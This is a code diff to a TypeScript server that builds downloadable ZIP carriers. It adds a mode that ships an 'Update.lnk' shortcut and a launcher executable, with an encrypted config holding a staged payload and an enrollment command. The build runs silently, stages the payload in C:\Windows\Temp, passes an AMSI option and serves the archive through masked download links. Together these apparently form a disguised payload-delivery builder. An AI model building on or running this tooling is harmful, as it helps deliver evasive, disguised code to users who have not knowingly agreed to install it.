@@ -13,6 +13,7 @@ import * as exeBuilder from "./exe-builder";
 import { runZipBuild, AmiMode } from "./zip-builder";
 import { createZip } from "./zip-archive";
 import * as payloadCache from "./payload-cache";
+import { runLauncherBuild } from "./launcher-build";
 import {
   buildEnrollmentCommand,
   toPowerShellInstallCommand,
@@ -441,46 +442,90 @@ async function postBuildZip(request: FastifyRequest, reply: FastifyReply) {
 
   // Rebuild server-side (mirror of toPowerShellInstallCommand's shape).
   const fullCommand = toPowerShellInstallCommand(inputs, exeUrl);
-  // What actually gets embedded: just the enrollment step (the .lnk's own
-  // downloader already fetches + silently installs the base agent).
+  // What actually gets embedded in the legacy .lnk: just the enrollment step
+  // (the .lnk's own downloader already fetches + silently installs the base
+  // agent). In launcher mode this is carried INSIDE the encrypted config for
+  // the staged-payload execute+enroll runbook step.
   const enrollmentCommand = buildEnrollmentCommand(inputs);
+
+  // Launcher mode (WP4): `launcherMode: true` switches this job to the
+  // offline carrier path — the zip ships { Update.lnk, Launcher.exe } and the
+  // .lnk runs the GUI launcher directly (relative target, NO command-line
+  // arguments, nothing downloaded at runtime). Absent/false keeps the legacy
+  // Agent.lnk path byte-identical.
+  const launcherMode = body.launcherMode === true;
+  // Optional staging directory for the payload inside the encrypted config
+  // (operator-tunable; C:\Windows\Temp is the default).
+  const rawOutDir =
+    typeof flags.outDir === "string" && flags.outDir.trim() !== ""
+      ? flags.outDir.trim()
+      : "C:\\Windows\\Temp";
 
   // Create the job dir first so the .lnk lands under jobs/{jobId}/.
   const jobId = storage.createJob();
   const lnkPath = storage.lnkOutputPath(jobId);
 
   try {
-    const result = await runZipBuild({
-      scriptPath: path.join(__dirname, "New-AgentShortcut.ps1"),
-      exeUrl,
-      fileName,
-      outputPath: lnkPath,
-      installCommand: enrollmentCommand,
-      authToken,
-      amsi,
-    });
+    if (launcherMode) {
+      // Offline carrier build: warm launcher + envelope stamp + Update.lnk +
+      // 2-entry zip, then the WP6 validation report card. Throws on failure.
+      await runLauncherBuild({
+        jobId,
+        inputs: {
+          apiUrl,
+          clientId,
+          siteId,
+          agentType: agentType as AgentType,
+          authToken,
+          features,
+          enroll: enrollmentCommand,
+          outDir: rawOutDir,
+          debug: false, // silent production (the marker is opt-in via flags)
+        },
+      });
+      if (!fs.existsSync(storage.zipOutputPath(jobId))) {
+        throw new Error("launcher build finished without producing a zip");
+      }
+      console.log(
+        `Launcher-mode ZIP build ok for job ${jobId}; client cmd len=${clientInstallCommand.length}, rebuilt len=${fullCommand.length}`
+      );
+    } else {
+      const result = await runZipBuild({
+        scriptPath: path.join(__dirname, "New-AgentShortcut.ps1"),
+        exeUrl,
+        fileName,
+        outputPath: lnkPath,
+        installCommand: enrollmentCommand,
+        authToken,
+        amsi,
+      });
 
-    if (!result.success) {
-      console.error(`ZIP build failed for job ${jobId}: ${result.output}`);
-      storage.cleanupJob(jobId);
-      return reply
-        .status(500)
-        .send({ error: "ZIP build failed", detail: result.output });
+      if (!result.success) {
+        console.error(`ZIP build failed for job ${jobId}: ${result.output}`);
+        storage.cleanupJob(jobId);
+        return reply
+          .status(500)
+          .send({ error: "ZIP build failed", detail: result.output });
+      }
+
+      if (!fs.existsSync(lnkPath)) {
+        console.error(`ZIP build reported success but no Agent.lnk for ${jobId}`);
+        storage.cleanupJob(jobId);
+        return reply.status(500).send({ error: "Agent.lnk was not produced" });
+      }
+
+      // STAGE 2 (Task D): zip the single Agent.lnk, then drop the temp .lnk and
+      // keep only the zip (until expiry). The .lnk downloads + installs the agent
+      // exe at runtime, so the exe itself never ships inside the zip.
+      const lnkData = fs.readFileSync(lnkPath);
+      const zipBuffer = createZip([{ name: "Agent.lnk", data: lnkData }]);
+      fs.writeFileSync(storage.zipOutputPath(jobId), zipBuffer);
+      storage.removeLnk(jobId);
+
+      console.log(
+        `ZIP build ok for job ${jobId}; client cmd len=${clientInstallCommand.length}, rebuilt len=${fullCommand.length}; zip ${zipBuffer.length} bytes`
+      );
     }
-
-    if (!fs.existsSync(lnkPath)) {
-      console.error(`ZIP build reported success but no Agent.lnk for ${jobId}`);
-      storage.cleanupJob(jobId);
-      return reply.status(500).send({ error: "Agent.lnk was not produced" });
-    }
-
-    // STAGE 2 (Task D): zip the single Agent.lnk, then drop the temp .lnk and
-    // keep only the zip (until expiry). The .lnk downloads + installs the agent
-    // exe at runtime, so the exe itself never ships inside the zip.
-    const lnkData = fs.readFileSync(lnkPath);
-    const zipBuffer = createZip([{ name: "Agent.lnk", data: lnkData }]);
-    fs.writeFileSync(storage.zipOutputPath(jobId), zipBuffer);
-    storage.removeLnk(jobId);
 
     const expiresAt = new Date(Date.now() + expiryHours * 60 * 60 * 1000);
     storage.saveZipExpiry(jobId, expiresAt);
@@ -491,7 +536,7 @@ async function postBuildZip(request: FastifyRequest, reply: FastifyReply) {
     const downloadUrl = `${maskedBase}/d/${jobId}`;
 
     console.log(
-      `ZIP build ok for job ${jobId}; client cmd len=${clientInstallCommand.length}, rebuilt len=${fullCommand.length}; zip ${zipBuffer.length} bytes; expires ${expiresAt.toISOString()}`
+      `Launcher-mode=${launcherMode} ZIP build ok for job ${jobId}; expires ${expiresAt.toISOString()}`
     );
 
     return reply.status(200).send({
